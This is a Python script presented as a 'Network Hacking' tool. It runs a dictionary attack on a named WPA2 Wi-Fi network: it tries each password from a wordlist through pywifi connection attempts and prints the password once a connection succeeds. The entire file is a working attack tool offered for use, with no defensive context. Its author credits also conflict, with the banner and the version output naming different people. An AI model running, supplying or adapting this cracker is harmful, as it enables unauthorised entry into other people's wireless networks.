import os
import sys

os.system("clear")

if os.geteuid() != 0:
    red_sudo = "\033[1;31m" + "sudo" + "\033[0m"
    print(f"You need to run this program with {red_sudo} Please !.")
    sys.exit(1)


import argparse
import os
import platform
import sys
import time
import pywifi
from pywifi import PyWiFi
from pywifi import const
from colorama import Fore, Style
from termcolor import colored
import pyfiglet
import random



def wait_with_spinner(seconds):
    symbols = "/-|\\"

    for _ in range(int(seconds)):
        for symbol in symbols:
            sys.stdout.write(f"\rPlease wait {symbol}  ")
            sys.stdout.flush()
            time.sleep(0.25)

    sys.stdout.write("\r" + " " * 20 + "\r")

wait_with_spinner(1)


colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white',
          'on_grey', 'on_red', 'on_green', 'on_yellow']

selected_color = random.choice(colors)

text = 'Network Hacking'

lo = pyfiglet.figlet_format(text)
colored_lo = colored(lo, color=selected_color)

print(colored_lo)

insta_text = (

    "--------------------------------------------------\n"
    f"{Fore.RED}INSTAGRAM{Fore.YELLOW} ==> {Fore.CYAN}https://www.instagram.com/r94xs/{Style.RESET_ALL}   \n"
    f"{Fore.RED}GitHub{Fore.YELLOW} =====> {Fore.CYAN}https://www.github.com/MohmmadALbaqer/{Style.RESET_ALL}   \n"
    "--------------------------------------------------"
)
print(insta_text)


CYAN = "\033[1;36m"
BLUE = "\033[0;34m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    results = ifaces.scan_results()
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except Exception as e:
    print("[-] Error:", e)
    type = False

def main(ssid, password, number):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(tmp_profile)
    time.sleep(0.35)
    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(BOLD, GREEN, '[*] Crack success!', RESET)
        print(BOLD, GREEN, '[*] password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Crack Failed using {}'.format(number, password))

def pwd(ssid, filee):
    number = 0
    with open(filee, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)

def menu():
    parser = argparse.ArgumentParser(description='argparse Example')
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')
    group1 = parser.add_mutually_exclusive_group()
    group1.add_argument('-v', '--version', metavar='', help='version')
    print(" ")
    args = parser.parse_args()
    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)
    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    elif args.version:
        print("\n\n", CYAN, "by Lencof\n")
        print(RED, " github", BLUE, " : https://github.com/Lencof/\n")
        print(GREEN, " CopyRight 2021\n\n")
        exit()
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        filee = input("[*] pwds file: : ")
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")
        print(BLUE, "[~] Cracking...")
        pwd(ssid, filee)
    else:
        print(RED, "[-] No Such File.", BLUE)

if __name__ == "__main__":
    menu()
